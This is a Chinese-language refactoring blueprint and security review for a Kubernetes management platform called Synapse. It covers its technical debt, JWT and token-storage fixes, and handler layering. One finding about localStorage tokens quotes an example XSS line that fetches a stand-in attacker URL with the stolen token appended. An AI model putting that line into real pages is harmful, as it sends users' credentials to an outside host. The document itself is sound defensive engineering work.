# Synapse 架構反思與重構藍圖

> 「任何號稱『完美無缺』的系統都是在實驗室裡的玩具，承認缺陷，正是走向偉大的開始。」

**文件版本**：v2.2 — 2026-04-12
**審視範圍**：`internal/`、`pkg/`、`cmd/`、`ui/src/`
**文件目的**：

1. 明列已知設計缺陷、反模式、技術債
2. 規劃優化方向與修復優先序
3. 描繪重構藍圖與未來路線圖
4. 作為後續工作的單一事實來源（Single Source of Truth）

> **Phase 0 ✅ 全部完成（2026-04-09）**：所有 Exit Criteria 已落地。P0-1 / P0-2 / P0-3 / P0-5 / P0-6 已完成；`make check` target（go test + go vet + gosec + grep 雙項）、`.githooks/pre-commit`、`docs/security/SECURITY_INCIDENT_REPORT_PHASE0.md` 三項補完。`gosec` 掃描需安裝工具後執行 `make check` 做最終人工確認。
>
> **Phase 1 進度（2026-04-10）**：**P0-4a + P0-4b + P0-4c 全部完成 ✅** — 全量推廣第一輪已完成：(1) Wave 1：從 21 個 K8s/外掛 handler 移除 dead `db *gorm.DB` 欄位；(2) Wave 2：8 個 handler 的 inline service 建構移至 Router 層注入；(3) Wave 3 Batch 1：為 Notification/NotifyChannel/SIEM/SystemSecurity 四個純 DB handler 建立 Service，完成 `h.db` 清除。P0-4c 全部完成（2026-04-10）：Batch 2 清除 helm/system_setting/log_source/portforward；Batch 3 清除 approval（ApprovalService）/ configmap+secret（ConfigVersionService 共用）/ image（ImageIndexService）/ multicluster（SyncPolicyService）。所有 40 個 handler 已無 `h.db` 直接注入。

---

## 目錄

- [零、現況體檢數據](#零現況體檢數據)
- [一、嚴重等級（P0 — 必須立刻修）](#一嚴重等級-p0--必須立刻修)
- [二、高等級（P1 — 本季度內修復）](#二高等級-p1--本季度內修復)
- [三、中等級（P2 — 六個月內修復）](#三中等級-p2--六個月內修復)
- [四、低等級（P3 — 持續改善）](#四低等級-p3--持續改善)
- [五、重構藍圖](#五重構藍圖)
- [六、功能深度拓展](#六功能深度拓展)
- [七、未來方向路線圖](#七未來方向路線圖)
- [八、分階段交付計畫](#八分階段交付計畫)
- [九、Phase Exit Criteria](#九phase-exit-criteria)
- [十、風險登記表](#十風險登記表)
- [十一、遷移安全策略](#十一遷移安全策略)
- [十二、ADR 機制與首批 ADR](#十二adr-機制與首批-adr)
- [十三、測試策略金字塔](#十三測試策略金字塔)
- [十四、Observability Baseline](#十四observability-baseline)
- [十五、Claude Code 模型分工建議](#十五claude-code-模型分工建議)
- [附錄 A：程式碼統計](#附錄-a程式碼統計)
- [附錄 B：執行手冊索引](#附錄-b執行手冊索引)

---

## 零、現況體檢數據

| 項目                              | 當前值                                                                                                  | 行業基準        | 差距          |
| --------------------------------- | ------------------------------------------------------------------------------------------------------- | --------------- | ------------- |
| 後端 Go 程式碼行數                | ~78,500                                                                                                 | —               | —             |
| 前端 TS/TSX 行數                  | ~83,600                                                                                                 | —               | —             |
| Handler 檔案數 / 平均行數         | ~~69 / 428~~ **134 / 223**                                                                              | < 300           | ✅ 已達標     |
| 最大 Handler 行數                 | ~~1,339 (rollout.go)~~ **477 (resource_yaml_apply.go)**                                                 | < 500           | ✅ 已達標     |
| 最大前端頁面行數                  | 1,398 (CostDashboard)                                                                                   | < 600           | 超標 133%     |
| Service 檔案數 / 平均行數         | 50 / 431                                                                                                | < 400           | 超標 8%       |
| 後端測試檔案數                    | 7                                                                                                       | —               | —             |
| 後端測試行數                      | 1,358                                                                                                   | —               | 估 ~2% 覆蓋率 |
| 前端測試檔案數                    | 6                                                                                                       | —               | 估 ~1% 覆蓋率 |
| 失敗測試數量                      | ~~1 (`TestDeleteUserGroup_Success`)~~ **0**（P0-3 完成）                                                | 0               | ✅            |
| `handler.db` 注入檔數             | 40                                                                                                      | 0               | 🔴            |
| handler 內 raw GORM 呼叫次數      | 150+                                                                                                    | 0               | 🔴            |
| handler 內 `context.Background()` | 84                                                                                                      | 0               | 🔴            |
| `WithContext` 總呼叫次數          | 29                                                                                                      | —               | 過低          |
| `Username == "admin"` 硬編碼      | ~~6 處~~ **0 處**（P0-2 完成，改用 `SystemRole`/`IsPlatformAdmin()`）                                   | 0               | ✅            |
| `InsecureSkipVerify: true`        | 4 處                                                                                                    | 0 (除白名單)    | 🟡            |
| User model 有無 role 欄位         | ~~❌ 無~~ **✅ `SystemRole` 已新增**（P0-2 完成）                                                       | ✅              | ✅            |
| JWT 可撤銷                        | ~~❌ 無 jti / 無 refresh~~ **✅ 已加 `jti` + `token_blacklist`**（P0-5 完成；refresh token 留 Phase 1） | ✅              | 🟡            |
| Token 儲存方式                    | ~~localStorage~~ **memory（Phase 0）**                                                                  | httpOnly cookie | 🟡            |
| OpenAPI/Swagger 文件              | ❌ 無                                                                                                   | ✅              | 🟡            |
| 分散式鎖 / Redis                  | ❌ 無                                                                                                   | ✅ (多節點場景) | 🟡            |
| 分散式追蹤                        | ❌ 無                                                                                                   | ✅              | 🟡            |
| 多 tenant 隔離欄位                | N/A（單組織定位，ADR-0009 Rejected）                                                                    | —               | ✅            |

> 結論：**系統已具備可用性，但在「可維運、可審計、可擴展」三個維度存在顯著技術債**。

---

## 一、嚴重等級 (P0 — 必須立刻修)

### P0-1 敏感資訊寫入日誌（Salt 洩漏）

> **狀態：✅ 已完成（2026-04-09）**
> `internal/services/auth_service.go:151` 已移除 Salt 輸出，改為結構化 k/v 的 `logger.Debug("authenticating local user", "username", username)`。已全域掃描敏感日誌，未發現其他 Salt / Password / Token 外洩點。

**現象**

```go
// internal/services/auth_service.go:151
logger.Info("驗證密碼 - 使用者: %s, Salt: %s", username, user.Salt)
```

每次登入都把該使用者密碼 Salt 列印到 server log。若日誌流轉到 ELK / Loki / 外部 SIEM，Salt 立即外洩，降低 bcrypt 抗暴破能力（雖然 bcrypt 本身會用內嵌 salt，但我們的業務把 `password + user.Salt` 拼接後再餵給 bcrypt，外洩等同把雜湊空間預備資料給對手）。

**CLAUDE.md 第 9 節明文禁止 log sensitive data**。

**修正**

```go
// 移除 Salt
logger.Debug("authenticating local user", "username", username)
```

並全域掃描 `logger.(Info|Debug|Warn|Error).*(salt|Salt|password|Password|token|Token|kubeconfig|secret)`，一律整改。

### P0-2 Username == "admin" 硬編碼超管邏輯

> **狀態：✅ 已完成（2026-04-09）**
>
> - 新增 `User.SystemRole` 欄位（`user` / `platform_admin` / `system_admin`，預設 `user`）與 `internal/models/role.go` 常數 + `IsPlatformAdmin()` helper
> - `internal/database/database.go` 新增 `backfillSystemRole()`：AutoMigrate 時將既有 `username=admin` 升級為 `platform_admin`；`createDefaultUser` 明確設 `SystemRole: RolePlatformAdmin`
> - 6 處硬編碼全部替換：`middleware/permission.go`（1 處）、`services/permission_service.go`（3 處）、`services/user_service.go`（2 處），皆改用 `user.IsPlatformAdmin()`
> - `apierrors.ErrUserAdminProtected` 訊息同步改為「不能刪除或停用平台管理員」
> - 測試：`user_service_test.go` mock rows 補 `system_role` 欄位；`permission_service_test.go` 修正；`go test ./internal/...` 全綠

**現象**

- `internal/middleware/permission.go:209` — `if username == "admin"`
- `internal/services/permission_service.go:361, 421, 553`
- `internal/services/user_service.go:111, 171`

`models.User` 本身**完全沒有 role 欄位**，整個平台管理員判斷依賴使用者名稱字面比較。任何人只要能把 DB 的 `users.username` 改掉，或建立一個 `username = "admin"` 的 LDAP 帳號，就能獲得平台超管權限。

**CLAUDE.md 第 10 節第三條明文禁止此模式**。

**修正**

1. 在 `User` model 加入：
   ```go
   SystemRole string `json:"system_role" gorm:"size:32;default:user;index"` // user | platform_admin | system_admin
   ```
2. 建立 `models/role.go` 常數：
   ```go
   const (
       RoleUser         SystemRole = "user"
       RolePlatformAdmin SystemRole = "platform_admin"
       RoleSystemAdmin   SystemRole = "system_admin" // 僅供 API Token / 內部程式使用
   )
   ```
3. 撰寫資料庫 migration：讀取 `username = 'admin'` 的使用者並標記為 `platform_admin`。
4. 替換所有 `username == "admin"` 為 `user.SystemRole == models.RolePlatformAdmin`。
5. 新增 `IsPlatformAdmin(userID)` helper + middleware。
6. 寫測試覆蓋權限判斷各種 role 組合。

### P0-3 失敗中的測試 (TestDeleteUserGroup_Success)

> **狀態：✅ 已完成（2026-04-09）**
> `permission_service_test.go` 更新為單一 transaction（Begin → DELETE user_group_members → UPDATE user_groups soft delete → Commit），與實際 service 行為一致。`go test ./internal/services/...` 全綠。

**現象**

```
--- FAIL: TestPermissionServiceSuite/TestDeleteUserGroup_Success
    permission_service_test.go:141
    刪除使用者組失敗: call to ExecQuery 'UPDATE user_groups SET deleted_at...'
    was not expected, next expectation is: ExpectedCommit
```

sqlmock 期望順序與實際 SQL 不符。測試一旦 FAIL，CI 保護網失效 → 其他新 bug 無法被攔截。

**修正**

1. 讀 `permission_service_test.go:141` 對應測試方法，補齊 `mock.ExpectExec` 的 soft-delete UPDATE 期望。
2. 導入 `make test` 作為 pre-push hook，保證綠燈才能 push。

### P0-4 Handler 層普遍違反分層原則

**證據**

- 40 個 handler 檔注入 `*gorm.DB`
- 150+ 處 raw GORM 呼叫 (`.Where/.First/.Find/.Create/.Update/.Delete/.Save`) 出現在 handler
- 僅 29 處 `WithContext` 在全專案
- 84 處 `context.Background()` 出現在 handler

後果：

1. **Context 遺失** — DB 查詢與請求生命週期脫鉤，使用者取消請求後查詢仍在跑，浪費連線
2. **無法 mock** — 測試必須起一個真實 DB
3. **跨層污染** — handler 需要理解 GORM 細節；service 層空心化
4. **違反 CLAUDE.md 第 1、2、3、5、6 節**

**修正**（漸進）

1. 先建立 `docs/REFACTOR_HANDLER.md` 列出 40 個檔案與建議 service 名稱
2. 每週清 5~10 個檔案，逐步把 DB 邏輯搬進 service
3. 強制新檔案不得注入 `*gorm.DB`（lint 規則 or code review check）
4. 在 `internal/handlers/common.go` 標示 `//lint:file-ignore` 但新增禁止 DB 注入的註解

#### 狀態：✅ P0-4a 已完成（2026-04-09）

Phase 1 第一步（Repository 介面 + 骨架）已落地，進入 pilot 遷移階段。

**本次交付**

| 檔案                                  | 內容                                                                                             |
| ------------------------------------- | ------------------------------------------------------------------------------------------------ |
| `internal/repositories/repository.go` | 泛型 `Repository[T any]` 介面（14 方法）、`ListOptions`、`Order`、`WhereClause` 輔助型別         |
| `internal/repositories/base.go`       | `BaseRepository[T]` 泛型實作，所有方法強制 `.WithContext(ctx)`                                   |
| `internal/repositories/errors.go`     | `ErrNotFound` / `ErrAlreadyExists` / `ErrInvalidArgument` 三個 sentinel                          |
| `internal/repositories/base_test.go`  | 7 組 sqlmock 單元測試（Get/NotFound/ZeroID/Count/UpdateFields/Transaction/Exists），全通過       |
| `internal/features/features.go`       | 最小可用的 Feature Flag 機制（envStore）+ `FlagRepositoryLayer` 等 6 個旗標常數                  |
| `internal/features/features_test.go`  | 3 組單元測試（mockStore、t.Setenv、SetStore reset），全通過                                      |
| `docs/adr/0001-repository-layer.md`   | **ADR-0001 — Accepted**（Repository 層導入與邊界）                                               |
| `docs/REFACTOR_HANDLER_GUIDE.md`      | Handler 遷移 12 步驟檢核表、Pilot 3 domain 指引、Feature Flag 準則、Code Review 紅線、陷阱與對策 |

**驗證結果**

- `go build ./internal/... ./pkg/... ./cmd/...` — clean
- `go vet ./internal/...` — clean
- `go test ./internal/repositories/... ./internal/features/...` — 皆 PASS
- 介面在 compile 期由 `var _ Repository[struct{}] = (*BaseRepository[struct{}])(nil)` 固定

#### 狀態：✅ P0-4b 已完成（2026-04-09）

Cluster / User / Permission 三個 pilot domain 完成遷移，dual-path 以 `FlagRepositoryLayer` 分流。

**本次交付**

| 檔案                                                  | 內容                                                                                                                                                                                             |
| ----------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `internal/repositories/cluster_repository.go`         | `ClusterRepository` interface + 實作；`FindByName` / `ListConnectable` / `FindByIDs` / `CountByStatus` 等 domain 方法                                                                            |
| `internal/repositories/user_repository.go`            | `UserRepository` interface + 實作；`FindByUsername` / `ListPaged(ListUsersFilter)` / 查詢條件分 Search / Status / AuthType 三軸                                                                  |
| `internal/repositories/permission_repository.go`      | `PermissionRepository` interface + 實作；涵蓋 `ClusterPermission` / `UserGroup` / `UserGroupMember` 三張表，含 `DeleteUserGroupTx` 事務、`AddUserToGroup` 冪等、`DistinctClusterIDsByUser` pluck |
| `internal/services/cluster_service.go`                | `NewClusterService(db, repo)`；所有方法內建 `useRepo()` helper，有 repo + flag 啟用時走 Repository，否則維持舊 `s.db` 路徑                                                                       |
| `internal/services/user_service.go`                   | 同上 pattern；`ListUsersFilter` 對應 Repository 的 `ListPaged` 參數                                                                                                                              |
| `internal/services/permission_service.go`             | 同上 pattern；`GetUserAccessibleClusterIDs` 的 User lookup 刻意留在 `s.db`（User 不屬於 PermissionRepository aggregate）                                                                         |
| `internal/services/auth_service.go`                   | 注入 `PermissionRepository`，內部組建的 `permissionSvc` 共用同一 repo                                                                                                                            |
| `internal/handlers/cluster.go`                        | 移除 `db *gorm.DB` 欄位；`getContainerSubnetIPs` 改走已注入的 `monitoringCfgSvc` + `promService`                                                                                                 |
| `internal/router/router.go`                           | 建立 3 個 repo 實例並注入對應 service；單一 DI 入口                                                                                                                                              |
| `internal/repositories/cluster_repository_test.go`    | 6 個 sqlmock 測試：FindByName Success/Empty、ListConnectable、FindByIDs EmptyShortCircuit/WithIDs、CountByStatus                                                                                 |
| `internal/repositories/user_repository_test.go`       | 5 個測試：FindByUsername Success/Empty/NotFound、ListPaged Search、ListPaged StatusAndAuthFilter                                                                                                 |
| `internal/repositories/permission_repository_test.go` | 12 個測試：ZeroID guard、NotFound 轉譯、empty short-circuit、冪等 INSERT、soft-delete 事務、pluck for IDs、Preload 組合                                                                          |

**驗證結果**

- `go build ./internal/... ./pkg/... ./cmd/...` — clean
- `go test ./internal/repositories/...` — 23/23 PASS
- `go test ./internal/services/... ./internal/handlers/...` — PASS（舊路徑 default 保持綠燈）
- Dual-path 開關：`SYNAPSE_FLAG_USE_REPO_LAYER=true` 啟用 Repository 路徑，未設或 `false` 維持舊路徑

**技術備忘**

- `GetCluster` 與所有 `PermissionService` 方法對外維持 ctx-less API（呼叫點 150+ / 30+，一次性改動風險過大），內部以 `context.Background()` 過渡；完整 ctx propagation 列入 P0-4c 統一處理
- `User` 相關查詢（`ListUsers` / `GetUser` / `GetUserAccessibleClusterIDs` 內的 User lookup）刻意保留在 `s.db`，因為它們屬於 UserRepository 而非 PermissionRepository aggregate
- sqlmock 撰寫陷阱：GORM 會把外層 WHERE 包一層額外括號、ORDER BY 會加 `ASC` 關鍵字，測試 SQL 正規表達式需對應

**剩餘 P0-4 子任務**

- **P0-4c**（Sonnet 主導）：推廣至剩餘 37 個 handler，依指南 §11 Batch 1/2/3 排程。
- Flag 移除 deadline：P0-4c 完成後 2 週內清掉舊路徑。

### P0-5 JWT 不可撤銷、無 Refresh Token

> **狀態：✅ Phase 0 範圍已完成（2026-04-09），Refresh Token 雙 Token 保留至 Phase 1**
>
> 本次交付：
>
> - `internal/services/auth_service.go`：JWT claims 加入 `jti`（uuid v4）、`iss`（`synapse`）、`aud`（`synapse-api`）、`nbf`、`iat`、`system_role`
> - 新增 `internal/models/token_blacklist.go`（`TokenBlacklist` 表；`jti` unique + `expires_at` index）與 `token_blacklist_service.go`（`sync.Map` 本地快取 + DB 持久化；warmCache、Revoke、IsRevoked、CleanupExpired）
> - `internal/middleware/auth.go` 重寫：強制 HS256 簽名算法白名單、驗證 `iss`/`aud`、查詢黑名單、將 `jti` 與 `token_exp` 寫入 gin context
> - `internal/handlers/auth.go`：`Logout` 改為讀 context 中的 `jti`/`token_exp`/`user_id`，呼叫 `blacklistSvc.Revoke(... TokenRevokeReasonLogout)`；`NewAuthHandler` 增加第三個參數 `blacklistSvc`
> - `internal/router/router.go`、`routes_ws.go`、`deps.go`：建立 `tokenBlacklistSvc` 並注入；`Logout` route 改為先通過 `AuthRequired`（才能取得 jti）
> - `internal/database/database.go`：`TokenBlacklist` 加入 AutoMigrate
> - 遺留：Refresh Token 雙 Token 機制、過期 jti 背景清理 worker — 排入 Phase 1

**現象**

```go
// internal/services/auth_service.go:208
token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{
    "user_id":   user.ID,
    "username":  user.Username,
    "auth_type": user.AuthType,
    "exp":       expiresAt.Unix(),
})
```

- 無 `jti`（JWT ID）→ 無法建立黑名單
- 無 `iss`/`aud`/`nbf`
- Logout 僅在前端刪 localStorage，token 在過期前持續有效
- JWT 一旦洩漏，唯一挽救手段是 **整個 JWT secret 輪換**，會讓所有線上 session 爆炸

**修正**

1. 加入 `jti: uuid.New().String()`
2. 新增 `token_blacklist` 或 `active_sessions` 表（SQLite 單機即可）
3. Logout 時寫入 `jti + exp` 到黑名單，AuthRequired 中介軟體查表
4. 過期 jti 由背景 worker 清理
5. 導入 Access Token (15min) + Refresh Token (7d) 雙 Token 機制
6. Refresh Token 以 **httpOnly Secure SameSite=strict cookie** 下發，Access Token 仍在 header（減少 XSS 面積）

### P0-6 Token 儲存於 localStorage（XSS 風險）

> **狀態：✅ Phase 0 範圍已完成（2026-04-09），httpOnly cookie 保留至 Phase 1**
>
> - `ui/src/services/authService.ts` `tokenManager` 改為 **模組作用域記憶體變數**（`accessToken`/`accessTokenExpiresAt`），`getToken`/`setToken`/`removeToken` 不再觸碰 localStorage
> - `isLoggedIn()` 改為以記憶體中 token 與過期時間判斷；`clear()` 仍清理舊版 localStorage key（相容性）
> - `ui/src/utils/api.ts` request interceptor 與 401 handler 全部改用 `tokenManager.getToken()`/`tokenManager.clear()`
> - 6 處原本直接讀 `localStorage.getItem('token')` 的檔案改為 `tokenManager.getToken()`：`aiService.ts`、`logService.ts`（兩處）、`SSHTerminal.tsx`、`KubectlTerminal.tsx`、`pages/terminal/kubectlTerminal.tsx`、`pages/pod/PodTerminal.tsx`
> - `user`、`permissions`、`token_expires_at` 仍保留於 localStorage（僅作 UX 提示，非認證依據）
> - UX 取捨：頁面重新整理後 token 消失，需要重新登入（已於 R0-4 風險登記表註記）
> - 驗證：`npx tsc --noEmit` 通過、`vitest run` 51 test cases 全綠
> - 遺留：httpOnly Secure SameSite=strict cookie 下發 Refresh Token、CSP / `X-Frame-Options` / `Referrer-Policy` security headers — 排入 Phase 1

**現象**

```ts
// ui/src/utils/api.ts:14
const token = localStorage.getItem("token");
```

任何 XSS 漏洞都可以 `fetch('https://attacker.com?t=' + localStorage.token)`。

**修正**

- 把 Access Token 改放 `memory`（Zustand store / React context），頁面刷新時靠 Refresh Token (httpOnly cookie) 重新換取
- 設定嚴格的 `Content-Security-Policy` header，禁止 inline script 與 eval
- 設定 `X-Content-Type-Options: nosniff`、`X-Frame-Options: DENY`、`Referrer-Policy: strict-origin-when-cross-origin`
- 引入 `helmet`-style 中介軟體集中管理 security headers

---

## 二、高等級 (P1 — 本季度內修復)

### P1-1 Handler 檔案肥胖症

> **狀態：✅ 已完成（2026-04-10）**
> 所有 handler 檔案已拆分至 < 500 行。134 個 handler 檔案（不含測試），平均 223 行/檔。

**拆分前（前 5 大）**

| 檔案               |  行數 |
| ------------------ | ----: |
| `rollout.go`       | 1,339 |
| `networkpolicy.go` | 1,106 |
| `deployment.go`    | 1,084 |
| `storage.go`       | 1,045 |
| `pod.go`           |   979 |

**拆分後（前 5 大）**

| 檔案                     | 行數 |
| ------------------------ | ---: |
| `resource_yaml_apply.go` |  477 |
| `ssh_terminal.go`        |  458 |
| `job.go`                 |  457 |
| `daemonset.go`           |  449 |
| `vpa.go`                 |  436 |

**已執行拆分**

| 原始檔案                    | 拆分結果                                                                                                             |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------- |
| `rollout.go` (1,339)        | `rollout_handler.go`, `rollout_related.go`, `rollout_converters.go`, `rollout_ops.go`                                |
| `networkpolicy.go` (1,106)  | `networkpolicy_handler.go`, `networkpolicy_crud.go`, `networkpolicy_cilium.go`                                       |
| `deployment.go` (1,084)     | `deployment_handler.go`, `deployment_crud.go`, `deployment_ops.go`                                                   |
| `storage.go` (1,045)        | `storage_handler.go`, `storage_pvc.go`, `storage_class.go`                                                           |
| `pod.go` (979)              | `pod_handler.go`, `pod_operations.go`, `pod_converters.go`                                                           |
| `kubectl_terminal.go` (647) | `kubectl_terminal_handler.go`, `kubectl_terminal_ws.go`, `kubectl_terminal_exec.go`, `kubectl_terminal_helpers.go`   |
| `permission.go` (639)       | `permission_handler.go`, `permission_user_group.go`, `permission_cluster.go`, `permission_user.go`                   |
| `pod_terminal.go` (594)     | `pod_terminal_handler.go`, `pod_terminal_ws.go`, `pod_terminal_exec.go`, `pod_terminal_helpers.go`                   |
| `volume_snapshot.go` (578)  | `volume_snapshot_handler.go`, `volume_snapshot_crd.go`, `volume_snapshot_velero.go`, `volume_snapshot_converters.go` |
| `alert.go` (573)            | `alert_handler.go`, `alert_alerts.go`, `alert_receiver.go`                                                           |
| `configmap.go` (566)        | `configmap_handler.go`, `configmap_crud.go`                                                                          |
| `system_setting.go` (559)   | `system_setting_handler.go`, `system_setting_grafana.go`                                                             |
| `secret.go` (549)           | `secret_handler.go`, `secret_crud.go`                                                                                |
| `search.go` (535)           | `search_handler.go`, `search_resources.go`                                                                           |
| `statefulset.go` (502)      | `statefulset_handler.go`, `statefulset_ops.go`                                                                       |

**拆分策略**

1. Handler struct + constructor + DTOs → `*_handler.go`
2. CRUD 操作（Create/Update/Delete）→ `*_crud.go` 或 `*_ops.go`
3. 輔助函式與 converters → `*_converters.go` 或 `*_helpers.go`
4. 相關子資源操作 → `*_related.go`

### P1-2 Router 單體檔案

`routes_cluster.go` 651 行全部 handler 在此內聯建構。新增一個資源就要改這個檔案，合併衝突頻繁。

**重構方向**

1. 每個資源領域獨立 `routes_<domain>.go`（`routes_workload.go` / `routes_network.go` / `routes_storage.go` / `routes_security.go`）
2. 引入輕量 DI：`wire` or 自寫 `container.go`；handler 建構改由 container 集中管理
3. router 只做「註冊」，不做「建構」
4. 新增單元測試覆蓋 route table 完整性（避免刪錯路由）

### P1-3 Service 層無介面 (interface)

目前所有 handler 直接依賴具體 service struct。導致：

- 測試必須手動 mock 或使用真實實例
- 無法做 decorator（如為特定 service 加統一快取、重試、熔斷）

**改進**

```go
// internal/services/contracts/cluster.go
package contracts

type ClusterService interface {
    GetCluster(id uint) (*models.Cluster, error)
    GetConnectableClusters() ([]*models.Cluster, error)
    // ...
}
```

handler 依賴介面而非結構。`go generate` + `mockery` 自動生成 mock。

### P1-4 無 OpenAPI / API 文件

REST API 超過 300 個 endpoint，卻沒有任何機讀規格。前後端協作依賴口頭溝通，外部整合困難。

**方案**

1. 短期：導入 `swaggo/swag`，在 handler 加 comment annotation 產生 `swagger.json`
2. 中期：規劃遷移到 `huma` 或 `ogen`，用 Go struct 反推 OpenAPI
3. 長期：考慮將核心 CRUD 改為 code-first GraphQL（`gqlgen`），可同時受益於 schema 驅動的前端型別生成

### P1-5 前端頁面肥胖症

> **狀態：✅ 已完成（2026-04-11）**
> 所有 > 700 行的頁面與 service 檔案已全數拆分，目前 ui/src 無任何檔案超過 700 行。
> 拆分清單（部分）：CostDashboard(1417→205)、LogCenter(1385→248)、NodeList(1156→228)、全部 6 個 Workload Tab(~980→~200)、PodList(928→239)、ContainerTab(979→103)、NodeOperations(957→158)、PermissionManagement(856→273)、AlertCenter(827→219)、Overview(811→124)、SecretList(786→198)、ConfigMapList(738→197)、NamespaceList(729→192)、MonitoringCenter(701→77)、PipelineRunDemo(767→258)、SecretCreate(725→233)。
> Service 拆分：workloadService.ts(1094→13 barrel)、yamlCommonService.ts(1030→36 barrel)。

| 檔案                |  行數 |
| ------------------- | ----: |
| `CostDashboard.tsx` | 1,398 |
| `LogCenter.tsx`     | 1,325 |
| `NodeList.tsx`      | 1,148 |
| `DeploymentTab.tsx` | 1,071 |
| `ContainerTab.tsx`  |   979 |

單頁面混雜資料抓取、狀態管理、UI、業務邏輯、converter。

**重構**

1. 抽出 `usePageX` hook 管理狀態與 queries
2. 抽出 `<PageXToolbar>` / `<PageXTable>` / `<PageXDrawer>` 子元件
3. Column 定義獨立為 `columns.tsx`，方便 i18n / snapshot test
4. 目標：單檔 < 400 行

### P1-6 Axios 請求 timeout 過短

```ts
// ui/src/utils/api.ts:6
timeout: 10000,
```

10 秒對於 K8s list + Prometheus 查詢經常不夠（60s 場景常見）。當前會產生「頁面白畫面」而非「等待中」。

**改善**

- 依 endpoint 類別分層：
  - 讀取單 resource → 15s
  - List / metrics → 60s
  - 大型匯出 (CSV) → 120s
- request interceptor 讀取 `config.meta.timeout`

### P1-7 前端無全域 ErrorBoundary

雖然 `ErrorBoundary.tsx` 存在，但未在 root 套用。單一頁面崩潰會讓整個 SPA 白畫面。

**修正**

在 `App.tsx` 最外層包 `<ErrorBoundary fallback={<ErrorPage />}>`，並依 Project Brain 中記錄的 pitfall：**不要直接暴露 `error.message`**，用通用文案 + 參考編號（request ID）。

### P1-8 In-Memory Rate Limiter 不跨實例

> **狀態：✅ 已完成（2026-04-11）**
>
> - 抽象 `RateLimiter` interface（`IsLocked` / `RecordFailure` / `Reset`）
> - `MemoryRateLimiter`：重構既有 in-memory 邏輯為 struct，移除 package-level global state
> - `RedisRateLimiter`：使用 `go-redis/v9`，key schema 為 `rl:fail:{key}` + `rl:lock:{key}`；Redis 不可用時 fail-open（允許請求並記錄 Warn）
> - `LoginRateLimit(limiter RateLimiter)` 接受注入 backend，不再依賴 global state
> - `config`：新增 `RedisConfig`（`REDIS_ADDR` / `REDIS_PASSWORD` / `REDIS_DB`）與 `RateLimiterConfig`（`RATE_LIMITER_BACKEND=redis` 啟用）
> - `router`：`buildRateLimiter()` 依設定選擇後端，Redis ping 失敗自動 fallback in-memory
> - 測試：8 個單元測試，覆蓋鎖定、過期、重設、middleware 整合

`middleware/rate_limit.go` 把登入失敗次數存在 Go 內的 `map[string]*loginAttempt`。多實例部署下，每個 pod 各自計數，攻擊者輪著 pod 打就能繞開。

**修正**

1. 抽象 `RateLimiter` interface，預設走 in-memory
2. 新增 `RedisRateLimiter` 實作（`go-redis/v9`）
3. 環境變數 `RATE_LIMITER_BACKEND=redis` 時啟用

### P1-9 測試覆蓋率嚴重不足

現況：7 個後端測試檔、6 個前端測試檔，覆蓋率估 < 5%。

**目標（3 個月）**

- 後端 service 層覆蓋率 ≥ 60%
- 後端 handler 層覆蓋率 ≥ 40%
- 前端關鍵頁面（登入、叢集列表、工作負載列表、權限管理）有 smoke test
- 建立 5 個 Playwright E2E 場景：登入、匯入叢集、建立 Deployment、刪除 Pod、查看 metrics

### P1-10 無分散式追蹤

> **狀態：✅ 已完成（2026-04-11）**
>
> - `internal/tracing/tracing.go`：`Setup(ctx, cfg)` 建立 OTel TracerProvider + W3C propagator；`Shutdown(ctx)` 供 main.go 呼叫
> - OTLP gRPC exporter 連線至 `OTEL_EXPORTER_OTLP_ENDPOINT`（Jaeger / Tempo）；連線失敗時 fail-open（noop provider）
> - Gin middleware：`otelgin.Middleware(serviceName)` 自動為每個 HTTP 請求建立 span
> - GORM plugin：`otelgorm.NewPlugin()` 為每次 DB 查詢注入 span（僅在 `OTEL_ENABLED=true` 時掛載）
> - `internal/tracing/http.go`：`NewHTTPClient(timeout)` — 所有外部 HTTP 呼叫（Prometheus、Grafana、ArgoCD）使用此 client 自動注入 traceparent header
> - Config：`TracingConfig`（`OTEL_ENABLED` / `OTEL_EXPORTER_OTLP_ENDPOINT` / `OTEL_SERVICE_NAME` / `OTEL_SAMPLING_RATE`）；預設 disabled
> - 測試：7 個單元測試覆蓋 disabled/empty endpoint/fail-open/sampler/shutdown/HTTP client

目前 observability 只有 Prometheus metrics。K8s API 聚合 + DB 查詢 + Prometheus 查詢交織，單一請求 latency 難以定位。

**修正**

1. 導入 OpenTelemetry SDK（`go.opentelemetry.io/otel`）
2. Gin middleware 自動 span
3. GORM plugin 注入 DB span
4. HTTP client wrapper 對 Prometheus/Grafana/ArgoCD 請求自動 span
5. OTLP exporter 發送到使用者自訂的 Jaeger / Tempo

---

## 三、中等級 (P2 — 六個月內修復)

### P2-1 缺乏多租戶 (Multi-Tenant) 能力 ✅ 2026-04-11（ADR 決議：不做）

> **已完成（2026-04-11）**：Synapse 定位明確為「**單組織內部運維平台**」，多租戶能力不在範疇內。ADR-0009 以 `Rejected` 狀態關閉，理由見下。

**ADR-0009 決議摘要 — Multi-Tenant 能力：不實作**

| 項目     | 內容                                                                                                                                                       |
| -------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **狀態** | ✅ Rejected（2026-04-11）                                                                                                                                  |
| **脈絡** | Synapse 是給單一組織內部維運人員使用的 K8s 管理平台，不需要向多個外部組織/客戶提供隔離視圖                                                                 |
| **決策** | 維持現有單組織架構；現有 RBAC（`SystemRole` + Cluster-level ACL）已足夠組織內部的權限分層                                                                  |
| **理由** | (1) 多租戶改造需重寫全部 DB 查詢加 `tenant_id`，工程量與風險遠超收益；(2) SaaS 場景不在 Synapse 藍圖內；(3) 若未來需要多組織，建議另立新平台或接入已有 IDP |
| **後果** | 無需新增 `Organization` model、無需 RLS、無需改寫 RBAC；節省 Phase 3 最大的工程項目                                                                        |

現況所有使用者共享單一 DB、單一叢集視野。若要給多個團隊/客戶使用，需要：

- Tenant 實體（`Organization`）
- User ↔ Organization 多對多
- Cluster 歸屬於 Organization
- 所有資源查詢加 `tenant_id` 條件
- RBAC 重新設計為 `Org → Role → Permission`

**定位確認**：Synapse 為「單組織內部運維平台」，上述改造列為 **不做（Rejected）**，以 ADR-0009 永久記錄此決策。

### P2-2 審計日誌未強化 ✅

`OperationLog` 有寫入但沒有：

- 雜湊鏈式防篡改（前一筆 hash 作為本筆 input）
- 批次上傳到 SIEM（Splunk / Elastic）
- 長期保存策略（保留 / 歸檔 / 刪除）
- 搜尋索引

**方案**

